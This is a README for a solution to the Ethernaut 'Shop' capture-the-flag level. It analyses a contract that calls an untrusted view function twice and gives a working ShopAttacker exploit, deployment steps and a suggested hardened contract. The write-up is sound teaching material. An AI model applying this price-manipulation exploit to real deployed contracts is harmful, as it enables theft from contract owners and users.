# 🏪 Ethernaut Level 21: Shop Challenge

This is a solution project for the [Ethernaut](https://ethernaut.openzeppelin.com/) Level 21 "Shop" challenge. This challenge aims to test your understanding of the interaction between Solidity view functions and state changes, and how to exploit these interactions to manipulate smart contract behavior.

## 🎯 Challenge Objective

Purchase items at a price lower than what the shop requires. The Shop contract prices items at 100, and we need to find a way to buy at a lower price.

## 📋 Contract Analysis

### Shop Contract

```solidity
contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

### Buyer Interface

```solidity
interface Buyer {
    function price() external view returns (uint256);
}
```

## 🔍 Vulnerability Analysis

### Key Vulnerabilities

1. **Interface Implementation Vulnerability**: The Shop contract relies on externally implemented `price()` functions
2. **Double Call**: The `buy()` function calls `price()` twice:
   - First time: In condition check (`_buyer.price() >= price`)
   - Second time: When updating price (`price = _buyer.price()`)
3. **State Dependency**: Between the two calls, the `isSold` state changes

### Attack Strategy

Since `price()` is a view function, it cannot modify state variables. But we can:
- Read the Shop contract's `isSold` state
- Return different prices based on the value of `isSold`
- Return high price (≥100) on first call
- Return low price (<100) on second call

## 🚀 Attack Implementation

### ShopAttacker Contract

```solidity
contract ShopAttacker {
    Shop private shop;

    constructor(address _contractAddress) {
        shop = Shop(_contractAddress);
    }

    function price() public view returns (uint256) {
        if (shop.isSold() == false) {
            return 101;  // First call: Pass price check
        }
        return 1;        // Second call: Set low price
    }

    function buy() public {
        shop.buy();
    }
}
```

## 🛠️ Usage Instructions

### Environment Requirements

- Node.js >= 16
- Hardhat
- TypeScript

### Install Dependencies

```bash
npm install
```

### Compile Contracts

```bash
npx hardhat compile
```

### Run Tests

```bash
npx hardhat test
```

### Deploy to Local Network

```bash
# Start local blockchain
npx hardhat node

# Deploy contracts
npx hardhat run scripts/deploy.ts --network localhost
```

### Using on Ethernaut Platform

1. Open browser developer tools
2. Get Shop contract instance address:
   ```javascript
   console.log(contract.address)
   ```
3. Deploy ShopAttacker contract (using the above address as parameter)
4. Call the `buy()` function to execute the attack
5. Verify results:
   ```javascript
   await contract.price() // Should display as 1
   ```

## 📚 Learning Points

### Solidity Security Issues

1. **Interface Trust Issues**: Never blindly trust external contract interface implementations
2. **View Function Security**: Even view functions can be maliciously manipulated
3. **State Check Timing**: Avoid making critical decisions based on multiple external function calls within the same function

### Gas Limit Considerations

In this challenge, the `price()` function has a 3000 gas limit, which restricts us from:
- Modifying storage state
- Executing complex computations
- Needing to use external state reading methods to implement conditional logic

### Protection Measures

1. **Implementation Checks**: Ensure all interface functions have proper implementations
2. **Single Decision**: Avoid making multiple decisions based on external call results
3. **State Locking**: Lock state changes during critical operations
4. **Reentrancy Protection**: Use reentrancy protection mechanisms

## 🔐 Improvement Suggestions

```solidity
contract SecureShop {
    uint256 public price = 100;
    bool public isSold;
    bool private _buying; // Reentrancy protection

    function buy(uint256 maxPrice) public payable {
        require(!_buying, "Reentrant call");
        require(!isSold, "Already sold");
        require(msg.value >= price, "Insufficient payment");
        require(maxPrice >= price, "Price too high");
        
        _buying = true;
        isSold = true;
        // Handle payment logic...
        _buying = false;
    }
}
```

## 📖 Related Resources

- [Ethernaut Official Website](https://ethernaut.openzeppelin.com/)
- [Solidity Documentation - View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)
- [OpenZeppelin Contract Security Guide](https://docs.openzeppelin.com/contracts/)

## 🤝 Contributing

Feel free to submit Pull Requests or open Issues to improve this project.

## 📄 License

This project is licensed under the MIT License.
